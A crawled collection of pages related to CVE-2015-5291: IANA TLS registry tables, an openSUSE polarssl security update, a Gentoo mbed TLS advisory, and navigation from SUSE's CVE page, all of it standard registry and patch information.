| 36 | TLMSP | - | N | N | [[ETSI TS 103 523-2](https://docbox.etsi.org/CYBER/CYBER/Open/Latest_Drafts/CYBER-0027-2v020-TLMSP-Transport-Layer-Middlebox-Security-Protocol.pdf)] |
| 37 | TLMSP\_proxying | - | N | N | [[ETSI TS 103 523-2](https://docbox.etsi.org/CYBER/CYBER/Open/Latest_Drafts/CYBER-0027-2v020-TLMSP-Transport-Layer-Middlebox-Security-Protocol.pdf)] |
| 38 | TLMSP\_delegate | - | N | N | [[ETSI TS 103 523-2](https://docbox.etsi.org/CYBER/CYBER/Open/Latest_Drafts/CYBER-0027-2v020-TLMSP-Transport-Layer-Middlebox-Security-Protocol.pdf)] |
| 39 | supported\_ekt\_ciphers | CH, EE | N | Y | [[RFC8870](https://www.iana.org/go/rfc8870)] |
| 40 | Reserved |  |  |  | [[tls-reg-review mailing list](https://mailarchive.ietf.org/arch/msg/tls-reg-review/5BD62HBFjo_AsW-Y8ohVuWEe1gI/)] |
| 41 | pre\_shared\_key | CH, SH | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 42 | early\_data | CH, EE, NST | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 43 | supported\_versions | CH, SH, HRR | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 44 | cookie | CH, HRR | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 45 | psk\_key\_exchange\_modes | CH | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 46 | Reserved |  |  |  | [[tls-reg-review mailing list](https://mailarchive.ietf.org/arch/msg/tls-reg-review/5BD62HBFjo_AsW-Y8ohVuWEe1gI/)] |
| 47 | certificate\_authorities | CH, CR | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 48 | oid\_filters | CR | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 49 | post\_handshake\_auth | CH | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 50 | signature\_algorithms\_cert | CH, CR | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 51 | key\_share | CH, SH, HRR | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)][[RFC Errata 5483](http://www.rfc-editor.org/errata_search.php?eid=5483)] |
| 52 | transparency\_info | CH, CR, CT | N | Y | [[RFC9162](https://www.iana.org/go/rfc9162)] |
| 53 | connection\_id (deprecated) | - | Y | N | [[RFC9146](https://www.iana.org/go/rfc9146)] |
| 54 | connection\_id | CH, SH | Y | N | [[RFC9146](https://www.iana.org/go/rfc9146)] |
| 55 | external\_id\_hash | CH, EE | N | Y | [[RFC8844](https://www.iana.org/go/rfc8844)] |
| 56 | external\_session\_id | CH, EE | N | Y | [[RFC8844](https://www.iana.org/go/rfc8844)] |
| 57 | quic\_transport\_parameters | CH, EE | N | Y | [[RFC9001](https://www.iana.org/go/rfc9001)] |
| 58 | ticket\_request | CH, EE | N | Y | [[RFC9149](https://www.iana.org/go/rfc9149)] |
| 59 | dnssec\_chain | CH, CT | N | N | [[RFC9102](https://www.iana.org/go/rfc9102)][[RFC Errata 6860](http://www.rfc-editor.org/errata_search.php?eid=6860)] |
| 60 | sequence\_number\_encryption\_algorithms | CH, HRR, SH | Y | N | [[draft-pismenny-tls-dtls-plaintext-sequence-number-01](https://www.iana.org/go/draft-pismenny-tls-dtls-plaintext-sequence-number-01)] |
| 61 | rrc | CH, SH | Y | N | [[draft-ietf-tls-dtls-rrc-10](https://www.iana.org/go/draft-ietf-tls-dtls-rrc-10)] |
| 62 | tls\_flags | CH,SH,HRR,EE,CR,CT,NST | N | N | [[draft-ietf-tls-tlsflags-14](https://www.iana.org/go/draft-ietf-tls-tlsflags-14)] |
| 63-2569 | Unassigned |  |  |  |  |
| 2570 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 2571-6681 | Unassigned |  |  |  |  |
| 6682 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 6683-10793 | Unassigned |  |  |  |  |
| 10794 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 10795-14905 | Unassigned |  |  |  |  |
| 14906 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 14907-19017 | Unassigned |  |  |  |  |
| 19018 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 19019-23129 | Unassigned |  |  |  |  |
| 23130 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 23131-27241 | Unassigned |  |  |  |  |
| 27242 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 27243-31353 | Unassigned |  |  |  |  |
| 31354 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 31355-35465 | Unassigned |  |  |  |  |
| 35466 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 35467-39577 | Unassigned |  |  |  |  |
| 39578 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 39579-43689 | Unassigned |  |  |  |  |
| 43690 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 43691-47801 | Unassigned |  |  |  |  |
| 47802 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 47803-51913 | Unassigned |  |  |  |  |
| 51914 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 51915-56025 | Unassigned |  |  |  |  |
| 56026 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 56027-60137 | Unassigned |  |  |  |  |
| 60138 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 60139-64249 | Unassigned |  |  |  |  |
| 64250 | Reserved | CH, CR, NST | N | N | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| 64251-64767 | Unassigned |  |  |  |  |
| 64768 | ech\_outer\_extensions | CH [[2](#note2)] | N | N | [[draft-ietf-tls-esni-17](https://www.iana.org/go/draft-ietf-tls-esni-17)] |
| 64769-65036 | Unassigned |  |  |  |  |
| 65037 | encrypted\_client\_hello | CH, HRR, EE | N | N | [[draft-ietf-tls-esni-17](https://www.iana.org/go/draft-ietf-tls-esni-17)] |
| 65038-65279 | Unassigned |  |  |  |  |
| 65280 | Reserved for Private Use |  |  |  | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 65281 | renegotiation\_info | - | N | Y | [[RFC5746](https://www.iana.org/go/rfc5746)] |
| 65282-65535 | Reserved for Private Use |  |  |  | [[RFC8446](https://www.iana.org/go/rfc8446)] |

## TLS Certificate Types

Registration Procedure(s)
```
Specification Required
```

Expert(s)
```
Yoav Nir, Rich Salz, Nick Sullivan
```

Reference
[[RFC6091](https://www.iana.org/go/rfc6091)][[RFC8446](https://www.iana.org/go/rfc8446)][[RFC8447](https://www.iana.org/go/rfc8447)]
Note
```
Registration requests should be sent to the mailing list described
in [[RFC 8447, Section 17](https://www.iana.org/go/rfc8447)]. If approved, designated experts should
notify IANA within three weeks. For assistance, please contact
iana@iana.org.

```

Note
```
The role of the designated expert is described in [[RFC8447](https://www.iana.org/go/rfc8447)].
The designated expert [[RFC8126](https://www.iana.org/go/rfc8126)] ensures that the specification is
publicly available.  It is sufficient to have an Internet-Draft
(that is posted and never published as an RFC) or a document from
another standards body, industry consortium, university site, etc.
The expert may provide more in-depth reviews, but their approval
should not be taken as an endorsement of the certificate type.

```

Note
```
If an item is not marked as "Recommended", it does not
necessarily mean that it is flawed; rather, it indicates that
the item either has not been through the IETF consensus process,
has limited applicability, or is intended only for specific use
cases.

```

Available Formats
[![](/_img/icons/text-csv.png)
CSV](tls-extensiontype-values-3.csv)

| Value | Name | Recommended | Reference | Comment |
| --- | --- | --- | --- | --- |
| 0 | X509 | Y | [[RFC6091](https://www.iana.org/go/rfc6091)][[RFC Errata 5976](http://www.rfc-editor.org/errata_search.php?eid=5976)] | Was X.509 before TLS 1.3. |
| 1 | OpenPGP\_RESERVED | N | [[RFC6091](https://www.iana.org/go/rfc6091)][[RFC8446](https://www.iana.org/go/rfc8446)] | Used in TLS versions prior to 1.3. |
| 2 | Raw Public Key | Y | [[RFC7250](https://www.iana.org/go/rfc7250)] |  |
| 3 | 1609Dot2 | N | [[RFC8902](https://www.iana.org/go/rfc8902)] |  |
| 4-223 | Unassigned |  |  |  |
| 224-255 | Reserved for Private Use |  | [[RFC6091](https://www.iana.org/go/rfc6091)] |  |

## TLS Certificate Status Types

Registration Procedure(s)
```
IETF Review
```

Reference
[[RFC6961](https://www.iana.org/go/rfc6961)][[RFC8446](https://www.iana.org/go/rfc8446)]
Available Formats
[![](/_img/icons/text-csv.png)
CSV](certificate-status.csv)

| Value | Description | Reference | Comment |
| --- | --- | --- | --- |
| 0 | Reserved | [[RFC6961](https://www.iana.org/go/rfc6961)] |  |
| 1 | ocsp | [[RFC6066](https://www.iana.org/go/rfc6066)][[RFC6961](https://www.iana.org/go/rfc6961)] |  |
| 2 | ocsp\_multi\_RESERVED | [[RFC6961](https://www.iana.org/go/rfc6961)][[RFC8446](https://www.iana.org/go/rfc8446)] | Used in TLS versions prior to 1.3. |
| 3-255 | Unassigned |  |  |

## TLS Application-Layer Protocol Negotiation (ALPN) Protocol IDs

Registration Procedure(s)
```
Expert Review
```

Expert(s)
```
Yoav Nir, Rich Salz, Nick Sullivan
```

Reference
[[RFC7301](https://www.iana.org/go/rfc7301)][[RFC8447](https://www.iana.org/go/rfc8447)]
Note
```
Registration requests should be sent to the mailing list described
in [[RFC 8447, Section 17](https://www.iana.org/go/rfc8447)]. If approved, designated experts should
notify IANA within three weeks. For assistance, please contact
iana@iana.org.

```

Available Formats
[![](/_img/icons/text-csv.png)
CSV](alpn-protocol-ids.csv)

| Protocol | Identification Sequence | Reference |
| --- | --- | --- |
| Reserved | 0x0A 0x0A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x1A 0x1A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x2A 0x2A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x3A 0x3A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x4A 0x4A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x5A 0x5A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x6A 0x6A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x7A 0x7A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x8A 0x8A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0x9A 0x9A | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0xAA 0xAA | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0xBA 0xBA | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0xCA 0xCA | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0xDA 0xDA | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0xEA 0xEA | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| Reserved | 0xFA 0xFA | [[RFC8701](https://www.iana.org/go/rfc8701)] |
| HTTP/0.9 | 0x68 0x74 0x74 0x70 0x2f 0x30 0x2e 0x39 ("http/0.9") | [[RFC1945](https://www.iana.org/go/rfc1945)] |
| HTTP/1.0 | 0x68 0x74 0x74 0x70 0x2f 0x31 0x2e 0x30 ("http/1.0") | [[RFC1945](https://www.iana.org/go/rfc1945)] |
| HTTP/1.1 | 0x68 0x74 0x74 0x70 0x2f 0x31 0x2e 0x31 ("http/1.1") | [[RFC9112](https://www.iana.org/go/rfc9112)] |
| SPDY/1 | 0x73 0x70 0x64 0x79 0x2f 0x31 ("spdy/1") | [<http://dev.chromium.org/spdy/spdy-protocol/spdy-protocol-draft1>] |
| SPDY/2 | 0x73 0x70 0x64 0x79 0x2f 0x32 ("spdy/2") | [<http://dev.chromium.org/spdy/spdy-protocol/spdy-protocol-draft2>] |
| SPDY/3 | 0x73 0x70 0x64 0x79 0x2f 0x33 ("spdy/3") | [<http://dev.chromium.org/spdy/spdy-protocol/spdy-protocol-draft3>] |
| Traversal Using Relays around NAT (TURN) | 0x73 0x74 0x75 0x6E 0x2E 0x74 0x75 0x72 0x6E ("stun.turn") | [[RFC7443](https://www.iana.org/go/rfc7443)] |
| NAT discovery using Session Traversal Utilities for NAT (STUN) | 0x73 0x74 0x75 0x6E 0x2E 0x6e 0x61 0x74 0x2d 0x64 0x69 0x73 0x63 0x6f 0x76 0x65 0x72 0x79 ("stun.nat-discovery") | [[RFC7443](https://www.iana.org/go/rfc7443)] |
| HTTP/2 over TLS | 0x68 0x32 ("h2") | [[RFC9113](https://www.iana.org/go/rfc9113)] |
| HTTP/2 over TCP | 0x68 0x32 0x63 ("h2c") | [[1](#note1)][[RFC9113](https://www.iana.org/go/rfc9113)] |
| WebRTC Media and Data | 0x77 0x65 0x62 0x72 0x74 0x63 ("webrtc") | [[RFC8833](https://www.iana.org/go/rfc8833)] |
| Confidential WebRTC Media and Data | 0x63 0x2d 0x77 0x65 0x62 0x72 0x74 0x63 ("c-webrtc") | [[RFC8833](https://www.iana.org/go/rfc8833)] |
| FTP | 0x66 0x74 0x70 ("ftp") | [[RFC959](https://www.iana.org/go/rfc959)][[RFC4217](https://www.iana.org/go/rfc4217)] |
| IMAP | 0x69 0x6d 0x61 0x70 ("imap") | [[RFC2595](https://www.iana.org/go/rfc2595)] |
| POP3 | 0x70 0x6f 0x70 0x33 ("pop3") | [[RFC2595](https://www.iana.org/go/rfc2595)] |
| ManageSieve | 0x6d 0x61 0x6e 0x61 0x67 0x65 0x73 0x69 0x65 0x76 0x65 ("managesieve") | [[RFC5804](https://www.iana.org/go/rfc5804)] |
| CoAP (over TLS) | 0x63 0x6f 0x61 0x70 ("coap") | [[RFC8323](https://www.iana.org/go/rfc8323)] |
| CoAP (over DTLS) | 0x63 0x6f ("co") | [[draft-lenders-core-coap-dtls-svcb-00](https://www.iana.org/go/draft-lenders-core-coap-dtls-svcb-00)] |
| XMPP jabber:client namespace | 0x78 0x6d 0x70 0x70 0x2d 0x63 0x6c 0x69 0x65 0x6e 0x74 ("xmpp-client") | [<https://xmpp.org/extensions/xep-0368.html>] |
| XMPP jabber:server namespace | 0x78 0x6d 0x70 0x70 0x2d 0x73 0x65 0x72 0x76 0x65 0x72 ("xmpp-server") | [<https://xmpp.org/extensions/xep-0368.html>] |
| acme-tls/1 | 0x61 0x63 0x6d 0x65 0x2d 0x74 0x6c 0x73 0x2f 0x31 ("acme-tls/1") | [[RFC8737](https://www.iana.org/go/rfc8737)] |
| OASIS Message Queuing Telemetry Transport (MQTT) | 0x6d 0x71 0x74 0x74 (“mqtt”) | [<http://docs.oasis-open.org/mqtt/mqtt/v5.0/mqtt-v5.0.html>] |
| DNS-over-TLS | 0x64 0x6F 0x74 ("dot") | [[RFC7858](https://www.iana.org/go/rfc7858)] |
| Network Time Security Key Establishment, version 1 | 0x6E 0x74 0x73 0x6B 0x65 0x2F 0x31 ("ntske/1") | [[RFC8915, Section 4](https://www.iana.org/go/rfc8915)] |
| SunRPC | 0x73 0x75 0x6e 0x72 0x70 0x63 ("sunrpc") | [[RFC9289](https://www.iana.org/go/rfc9289)] |
| HTTP/3 | 0x68 0x33 ("h3") | [[RFC9114](https://www.iana.org/go/rfc9114)] |
| SMB2 | 0x73 0x6D 0x62 (“smb”) | [<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962>] |
| IRC | 0x69 0x72 0x63 ("irc") | [[RFC1459](https://www.iana.org/go/rfc1459)] |
| NNTP (reading) | 0x6E 0x6E 0x74 0x70 ("nntp") | [[RFC3977](https://www.iana.org/go/rfc3977)] |
| NNTP (transit) | 0x6E 0x6E 0x73 0x70 ("nnsp") | [[RFC3977](https://www.iana.org/go/rfc3977)] |
| DoQ | 0x64 0x6F 0x71 ("doq") | [[RFC9250](https://www.iana.org/go/rfc9250)] |
| SIP | 0x73 0x69 0x70 0x2f 0x32 ("sip/2") | [[RFC3261](https://www.iana.org/go/rfc3261)] |
| TDS/8.0 | 0x74 0x64 0x73 0x2f 0x38 0x2e 0x30 ("tds/8.0") | [[[MS-TDS]: Tabular Data Stream Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec)] |
| DICOM | 0x64 0x69 0x63 0x6f 0x6d ("dicom") | [<https://www.dicomstandard.org/current>] |
| PostgreSQL | 0x70 0x6F 0x73 0x74 0x67 0x72 0x65 0x73 0x71 0x6C ("postgresql") | [<https://www.postgresql.org/docs/current/protocol.html>] |
| RADIUS/1.0 | 0x72 0x61 0x64 0x69 0x75 0x73 0x2f 0x31 0x2e 0x30 ("radius/1.0") | [[RFC-ietf-radext-radiusv11-11](https://www.iana.org/go/draft-ietf-radext-radiusv11-11)] |
| RADIUS/1.1 | 0x72 0x61 0x64 0x69 0x75 0x73 0x2f 0x31 0x2e 0x31 ("radius/1.1") | [[RFC-ietf-radext-radiusv11-11](https://www.iana.org/go/draft-ietf-radext-radiusv11-11)] |

## TLS CachedInformationType Values

Expert(s)
```
Yoav Nir, Rich Salz, Nick Sullivan
```

Reference
[[RFC7924](https://www.iana.org/go/rfc7924)]
Note
```
Requests for assignments from the registry's Specification
Required range should be sent to the mailing list described in
[[RFC 8447, Section 17](https://www.iana.org/go/rfc8447)]. If approved, designated experts should
notify IANA within three weeks. For assistance, please contact
iana@iana.org.

```

Available Formats
[![](/_img/icons/text-csv.png)
CSV](cachedinformationtype.csv)

| Range | Registration Procedures |
| --- | --- |
| 0-63 | Standards Action |
| 64-223 | Specification Required |

| Value | Description | Reference |
| --- | --- | --- |
| 0 | Reserved | [[RFC7924](https://www.iana.org/go/rfc7924)] |
| 1 | cert | [[RFC7924](https://www.iana.org/go/rfc7924)] |
| 2 | cert\_req | [[RFC7924](https://www.iana.org/go/rfc7924)] |
| 3-223 | Unassigned |  |
| 224-255 | Reserved for Private Use | [[RFC7924](https://www.iana.org/go/rfc7924)] |

## TLS Certificate Compression Algorithm IDs

Expert(s)
```
Yoav Nir, Rich Salz, Nick Sullivan
```

Reference
[[RFC8879](https://www.iana.org/go/rfc8879)]
Note
```
Requests for assignments from the registry's Specification
Required range should be sent to the mailing list described in
[[RFC 8447, Section 17](https://www.iana.org/go/rfc8447)]. If approved, designated experts should
notify IANA within three weeks. For assistance, please contact
iana@iana.org.

```

Available Formats
[![](/_img/icons/text-csv.png)
CSV](tls-certificate-compression-algorithm-ids.csv)

| Range | Registration Procedures |
| --- | --- |
| 1-255 | IETF Review |
| 256-16383 | Specification Required |
| 16384-65535 | Experimental Use |

| Algorithm Number | Description | Reference |
| --- | --- | --- |
| 0 | Reserved | [[RFC8879](https://www.iana.org/go/rfc8879)] |
| 1 | zlib | [[RFC8879](https://www.iana.org/go/rfc8879)] |
| 2 | brotli | [[RFC8879](https://www.iana.org/go/rfc8879)] |
| 3 | zstd | [[RFC8879](https://www.iana.org/go/rfc8879)] |
| 4-16383 | Unassigned |  |
| 16384-65535 | Reserved for Experimental Use | [[RFC8879](https://www.iana.org/go/rfc8879)] |

# Footnotes

| [1] | ``` This entry reserves an identifier for use within a cleartext version  of a protocol and is not allowed to appear in a TLS ALPN negotiation.      ``` |
| --- | --- |
| [2] | ``` Only appears in inner CH.      ``` |

[Licensing Terms](https://www.iana.org/help/licensing-terms)



=== Content from lists.opensuse.org_644470e5_20250125_143418.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/updates%40lists.opensuse.org/message/TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC/)
[Sign Up](/accounts/signup/?next=/archives/list/updates%40lists.opensuse.org/message/TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC/)

[Manage this list](/manage/lists/updates.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/updates%40lists.opensuse.org/message/TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC/)
[Sign Up](/accounts/signup/?next=/archives/list/updates%40lists.opensuse.org/message/TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/updates%40lists.opensuse.org/thread/TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC/#TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC)

# openSUSE-SU-2015:2371-1: moderate: Security update for polarssl

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

27 Dec
2015

27 Dec
'15

00:12

openSUSE Security Update: Security update for polarssl
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2015:2371-1
Rating: moderate
References: #949380
Cross-References: CVE-2015-5291
Affected Products:
openSUSE 13.2
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
This update for polarssl fixes the following security issue:
\* CVE-2015-5291: Remote code execution via session tickets or SNI
(boo#949380)
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 13.2:
zypper in -t patch openSUSE-2015-962=1
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 13.2 (i586 x86\_64):
libpolarssl7-1.3.9-11.1
libpolarssl7-debuginfo-1.3.9-11.1
polarssl-devel-1.3.9-11.1
References:
<https://www.suse.com/security/cve/CVE-2015-5291.html>
<https://bugzilla.suse.com/949380>

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/updates%40lists.opensuse.org/message/TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC/)
Use email software

[Back to the thread](/archives/list/updates%40lists.opensuse.org/thread/TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC/#TGKEATQNDVFB3X3A6KDXSTN5NHX5BLEC)

[Back to the list](/archives/list/updates%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from guidovranken.wordpress.com_1c33bfd4_20250125_143423.html ===

Guido Vranken
Coming Soon

[WordPress.com](https://wordpress.com/?ref=coming_soon "WordPress.com")

Build a website. Sell your stuff. Write a blog. And so much more.

[Log in](//wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fguidovranken.com%252F2015%252F10%252F07%252Fcve-2015-5291%252F)

[Start your website](https://wordpress.com/?ref=coming_soon)



=== Content from security.gentoo.org_6699c1bd_20250125_143424.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# mbed TLS: Multiple vulnerabilities — GLSA **201706-18**

Multiple vulnerabilities have been found in mbed TLS, the worst of
which could lead to the remote execution of arbitrary code.

### Affected packages

| Package | **net-libs/mbedtls** on all architectures |
| --- | --- |
| Affected versions | < **2.4.2** |
| Unaffected versions | >= **2.4.2** |

### Background

mbed TLS (previously PolarSSL) is an “easy to understand, use,
integrate and expand” implementation of the TLS and SSL protocols and
the respective cryptographic algorithms and support code required.

### Description

Multiple vulnerabilities have been discovered in mbed TLS. Please review
the CVE identifiers referenced below for details.

### Impact

A remote attacker could possibly execute arbitrary code with the
privileges of the process, or cause a Denial of Service condition.

### Workaround

There is no known workaround at this time.

### Resolution

All mbed TLS users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-libs/mbedtls-2.4.2"

```
### References

* [CVE-2015-5291](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-5291)
* [CVE-2015-7575](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7575)
* [CVE-2017-2784](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-2784)

**Release date**

June 20, 2017

**Latest revision**

June 20, 2017: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [562608](https://bugs.gentoo.org/show_bug.cgi?id=562608)
* [571102](https://bugs.gentoo.org/show_bug.cgi?id=571102)
* [618824](https://bugs.gentoo.org/show_bug.cgi?id=618824)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.suse.com_8192718c_20250126_093437.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2015-5291.html)
[English](https://www.suse.com/security/cve/CVE-2015-5291.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2015-5291.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2015-5291.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2015-5291.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2015-5291.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2015-5291.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2015-5291.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

